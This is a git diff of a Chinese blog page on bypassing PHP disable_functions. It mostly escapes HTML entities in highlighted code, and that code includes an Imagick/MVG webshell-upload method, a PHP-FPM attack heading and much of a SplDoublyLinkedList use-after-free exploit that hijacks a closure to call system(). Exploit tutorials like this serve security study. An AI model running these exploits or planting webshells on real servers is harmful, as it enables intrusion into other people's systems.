+  <span class="token variable">$imagick</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">readImageBlob</span><span class="token punctuation">(</span><span class="token variable">$imageBlob</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 
 
@@ -1194,7 +1194,7 @@ AAAAAElFTkSuQmCC"<span class="token punctuation">;</span>
 
 <span class="token function">readImageBlob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>也就是说我们要通过以post的方式img去传递，把我们的payload编码传递进去，然后执行</p>
 <p><strong>写一句话木马payload</strong></p>
 <pre><code>push graphic-context
@@ -1260,19 +1260,19 @@ pop graphic<span class="token operator">-</span>context
 
 <span class="token variable">$thumb</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readImage</span><span class="token punctuation">(</span><span class="token string">'KKKK.mvg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">readImage</span><span class="token punctuation">(</span><span class="token string">'KKKK.mvg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeImage</span><span class="token punctuation">(</span><span class="token string">'KKKK.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">writeImage</span><span class="token punctuation">(</span><span class="token string">'KKKK.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"KKKK.mvg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"KKKK.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="利用攻击PHP-FPM"><a href="#利用攻击PHP-FPM" class="headerlink" title="利用攻击PHP-FPM"></a><strong>利用攻击PHP-FPM</strong></h3><h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a><strong>使用条件</strong></h4><ul>
 <li>Linux 操作系统</li>
 <li>PHP-FPM</li>
@@ -1508,7 +1508,7 @@ unsigned char paddingData[paddingLength];
 
      <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-     <span class="token variable">$i</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>
+     <span class="token variable">$i</span> <span class="token operator">&gt;</span><span class="token operator">&gt;=</span> <span class="token number">8</span><span class="token punctuation">;</span>
 
  <span class="token punctuation">}</span>
 
@@ -1540,7 +1540,7 @@ unsigned char paddingData[paddingLength];
 
   <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$address</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-  <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token punctuation">}</span>
 
@@ -1556,7 +1556,7 @@ unsigned char paddingData[paddingLength];
 
      <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">,</span> <span class="token variable">$end</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$end</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0x200000</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$length</span> <span class="token operator">&lt;=</span> <span class="token number">0x300000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$end</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">0x200000</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$length</span> <span class="token operator">&lt;=</span> <span class="token number">0x300000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 
        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$end</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$length</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
@@ -1658,7 +1658,7 @@ unsigned char paddingData[paddingLength];
 
      <span class="token variable">$nameAddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nameAddr</span> <span class="token operator">></span> <span class="token variable">$address</span> <span class="token operator">||</span> <span class="token variable">$nameAddr</span> <span class="token operator">&lt;</span> <span class="token variable">$lowestAddr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nameAddr</span> <span class="token operator">&gt;</span> <span class="token variable">$address</span> <span class="token operator">||</span> <span class="token variable">$nameAddr</span> <span class="token operator">&lt;</span> <span class="token variable">$lowestAddr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 
        <span class="token keyword">continue</span><span class="token punctuation">;</span>
 
@@ -1698,11 +1698,11 @@ unsigned char paddingData[paddingLength];
 
      <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-     <span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-     <span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0x1234567812345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0x1234567812345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]UAF Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
@@ -1762,13 +1762,13 @@ unsigned char paddingData[paddingLength];
 
      <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-     <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x08</span> <span class="token operator">*</span> <span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x08</span> <span class="token operator">*</span> <span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
  <span class="token punctuation">}</span>
 
   <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$system_address</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$system_address</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
   <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
@@ -1776,7 +1776,7 @@ unsigned char paddingData[paddingLength];
 
   <span class="token keyword">echo</span> <span class="token string">"[+]Executing command: \n"</span><span class="token punctuation">;</span>
 
- <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"php -v"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"php -v"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token punctuation">}</span>
 
@@ -1844,19 +1844,19 @@ unsigned char paddingData[paddingLength];
 
 <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SplDoublyLinkedList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"Twings"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"Twings"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token number">0x100</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 
-  <span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0x1234567812345678</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0x1234567812345678</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token punctuation">}</span>
 
-<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">rewind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token function">rewind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009180228698.png" alt="img"></p>
@@ -2260,7 +2260,7 @@ unsigned char paddingData[paddingLength];
                     <div class="card-image">
                         
                         
-                        <img src="/images/loading.gif" data-original="/medias/featureimages/12.jpg" class="responsive-img" alt="不死马php">
+                        <img src="/images/loading.gif" data-original="/medias/featureimages/8.jpg" class="responsive-img" alt="不死马php">
                         
                         <span class="card-title">不死马php</span>
                     </div>
@@ -2311,7 +2311,7 @@ unsigned char paddingData[paddingLength];
                     <div class="card-image">
                         
                         
-                        <img src="/images/loading.gif" data-original="/medias/featureimages/13.jpg" class="responsive-img" alt="sql注入绕过安全狗">
+                        <img src="/images/loading.gif" data-original="/medias/featureimages/9.jpg" class="responsive-img" alt="sql注入绕过安全狗">
                         
                         <span class="card-title">sql注入绕过安全狗</span>
                     </div>
@@ -2520,7 +2520,7 @@ phpstudy
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">17.3k</span>
+            <span class="white-color">21.4k</span>
             
 
             <br>
